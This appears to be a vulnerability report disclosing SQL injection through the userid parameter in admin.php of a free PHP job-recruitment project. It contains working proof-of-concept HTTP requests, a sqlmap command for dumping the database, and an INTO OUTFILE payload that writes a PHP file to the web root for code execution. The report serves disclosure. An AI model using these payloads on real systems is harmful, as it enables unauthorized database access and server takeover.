# Job-recruitment-in-php has sql injection vulnerability in admin.php  

## supplier
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
admin.php
## describe
Through code audit, when there is an unauthorized SQL injection vulnerability in the admin.php of the Job_Recruitment systtem foreground login portal, all the information of the database can be obtained without authorization, and arbitrary commands may be executed. control parameter: **$userid**

## code analysis
The **$userid** parameters of the admin.php are not filtered and concatenated into the SQL statement for execution. 

![image-20241110223535966](https://github.com/user-attachments/assets/f9873589-53e0-4744-bd8a-0001cb911871))

## POC

### get data from databases;

```
POST /admin.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/admin.php/
Cookie: PHPSESSID=ae0a2j2ltu9oha37giuamhqjkn
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=delete_user&userid=1*
```

save as 1.txt 

and excute the command

```
python sqlmap.py -r 1.txt --dbs
```

get database: owlphin

![image-20241110215358910](https://github.com/user-attachments/assets/5f24609f-82a2-4c09-872d-57b3b685ad73)

### RCE

```
POST /admin.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/admin.php/
Cookie: PHPSESSID=ae0a2j2ltu9oha37giuamhqjkn
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=delete_user&userid=1'+union+select+'<?php phpinfo();?>'+into+outfile+'D:/phpstudy_pro/WWW/ai-recruitment-system-master/phpinfo.php'--+#
```

result

![image-20241111092339446](https://github.com/user-attachments/assets/4c7f05fa-02f1-4b0b-994f-95f8be2f716b)
